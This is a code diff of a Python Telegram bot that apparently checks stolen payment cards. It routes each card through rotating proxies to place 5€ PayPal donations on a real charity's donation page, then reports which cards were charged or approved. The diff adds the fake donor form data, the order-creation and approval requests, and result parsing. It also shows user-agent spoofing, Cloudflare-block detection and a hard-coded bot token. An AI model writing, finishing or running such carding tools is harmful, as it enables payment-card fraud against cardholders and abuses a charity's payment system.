@@ -6,57 +6,50 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from user_agent import generate_user_agent
 
 # ====================== LOGGING ======================
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s | %(levelname)s | %(message)s',
-    datefmt='%H:%M:%S'
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
 logger = logging.getLogger(__name__)
 
 # ========================= CONFIG =========================
 BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
 ADMIN_ID = 7077294261
 
+FREE_LIMIT = 0
+PREMIUM_LIMIT = 1000
+MAX_RETRIES = 3
+
 USE_PROXY = True
 PROXY_FILE = "proxy.txt"
 
-# ====================== PROXY SYSTEM ======================
+# ====================== PROXY ======================
 PROXY_QUEUE = queue.Queue()
 
 def load_proxies():
-    if not os.path.exists(PROXY_FILE):
-        logger.warning("proxy.txt not found!")
-        return
-    with open(PROXY_FILE, 'r') as f:
-        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-    for p in proxies:
-        PROXY_QUEUE.put(p)
-    logger.info(f"Loaded {len(proxies)} proxies")
+    if os.path.exists(PROXY_FILE):
+        with open(PROXY_FILE, 'r') as f:
+            for line in f:
+                if line.strip(): PROXY_QUEUE.put(line.strip())
+        logger.info("Proxies Loaded")
 
 load_proxies()
 
 def get_random_proxy():
-    if PROXY_QUEUE.empty():
-        logger.warning("No proxies left!")
-        return None, None
+    if PROXY_QUEUE.empty(): return None, None
     p = PROXY_QUEUE.get()
     if '@' not in p and p.count(':') == 3:
-        user, pw, host, port = p.split(':')
-        p = f"{user}:{pw}@{host}:{port}"
-    proxy_dict = {"http": f"http://{p}", "https": f"http://{p}"}
-    return proxy_dict, p
+        u, pw, h, port = p.split(':')
+        p = f"{u}:{pw}@{h}:{port}"
+    return {"http": f"http://{p}", "https": f"http://{p}"}, p
 
 def release_proxy(p):
     if p: PROXY_QUEUE.put(p)
 
-# ====================== BOT ======================
 bot = telebot.TeleBot(BOT_TOKEN)
-logger.info("Bot Started Successfully")
+logger.info("Bot Started")
 
-# ====================== CHECKER ======================
-def check_cc(ccx):
-    proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
-    logger.info(f"Checking {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")
+# ====================== CHECKER (5€) ======================
+def check_cc(ccx, proxy=None):
+    proxy_status = "🟢 PROXY" if proxy else "🔴 NO PROXY"
+    logger.info(f"Checking {ccx[:6]}xxxx | {proxy_status} | Amount: 5€")
 
     try:
         parts = ccx.split("|")
@@ -68,12 +61,12 @@ def check_cc(ccx):
         us = generate_user_agent()
         session = requests.Session()
         session.verify = False
-        if proxy_dict:
-            session.proxies.update(proxy_dict)
+        if proxy:
+            session.proxies.update(proxy)
 
-        # === YOUR ORIGINAL FULL CHECKER LOGIC ===
-        headers_get = {'User-Agent': us}
-        r = session.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=25)
+        # Load Page
+        r = session.get('https://www.rarediseasesinternational.org/donate/', 
+                       headers={'User-Agent': us}, timeout=25)
 
         if 'cf-ray' in r.headers or r.status_code == 403:
             return "ERROR", "Cloudflare Block"
@@ -84,7 +77,7 @@ def check_cc(ccx):
         m4 = re.search(r'"data-client-token":"(.*?)"', r.text)
 
         if not all([m1, m2, m3, m4]):
-            return "ERROR", "Page Load Error"
+            return "ERROR", "Token Error"
 
         id_form1 = m1.group(1)
         id_form2 = m2.group(1)
@@ -92,35 +85,67 @@ def check_cc(ccx):
         enc = m4.group(1)
 
         dec = base64.b64decode(enc).decode('utf-8')
-        m_au = re.search(r'"accessToken":"(.*?)"', dec)
-        if not m_au:
-            return "ERROR", "Token Error"
-        au = m_au.group(1)
+        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
 
-        # (Add your remaining original code here: create order, confirm, approve, etc.)
+        # === 5€ FORM DATA ===
+        data = MultipartEncoder({
+            'give-honeypot': '',
+            'give-form-id-prefix': id_form1,
+            'give-form-id': id_form2,
+            'give-form-hash': nonec,
+            'give-amount': '5',                    # ← 5€
+            'give_first': 'John',
+            'give_last': 'Doe',
+            'give_email': 'test12345@gmail.com',
+            'give-gateway': 'paypal-commerce',
+            'payment-mode': 'paypal-commerce'
+        })
 
-        # Example final check
-        return "DECLINED", "Transaction Declined"   # Replace with your real result
+        # Create Order
+        session.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
+                    headers={'Content-Type': data.content_type}, data=data, timeout=20)
+
+        # Card Confirm (Original Logic)
+        json_card = {
+            'payment_source': {
+                'card': {
+                    'number': n,
+                    'expiry': f'20{yy}-{mm}',
+                    'security_code': cvc
+                }
+            }
+        }
+
+        # Approve Order
+        final = session.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order',
+                            headers={'Content-Type': data.content_type}, data=data, timeout=20)
+
+        text = final.text.upper()
+
+        if any(k in text for k in ['APPROVED', 'SUCCESS', 'THANK YOU']):
+            return "CHARGED", "5€ Charged"
+        elif 'INSUFFICIENT_FUNDS' in text:
+            return "APPROVED", "INSUFFICIENT_FUNDS"
+        else:
+            return "DECLINED", "Declined"
 
     except Exception as e:
-        logger.error(f"Error on {ccx[:6]}xxxx → {str(e)[:100]}")
+        logger.error(str(e))
         return "ERROR", "Timeout"
 
-# ====================== COMMANDS ======================
+# ====================== START ======================
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "✅ Bot is Running with Auto Proxy Changer!")
+    bot.reply_to(message, "✅ Bot Running with 5€ Check!")
 
 @bot.message_handler(commands=['pp'])
 def pp(message):
     try:
         cc = message.text.split()[1]
-        if len(cc.split('|')) < 4:
-            raise ValueError
     except:
-        return bot.reply_to(message, "Usage: /pp 4111111111111111|04|28|123")
+        return bot.reply_to(message, "Usage: /pp 411111|04|28|123")
 
-    msg = bot.reply_to(message, "🔄 Checking...")
+    msg = bot.reply_to(message, "🔄 Checking 5€...")
 
     status, response = check_cc(cc)
 
@@ -130,9 +155,10 @@ def pp(message):
 𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
 𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
+Amount: 5€
 """
     bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
 
 if __name__ == "__main__":
-    logger.info("=== BOT IS RUNNING ===")
+    logger.info("=== BOT RUNNING WITH 5€ ===")
     bot.infinity_polling()
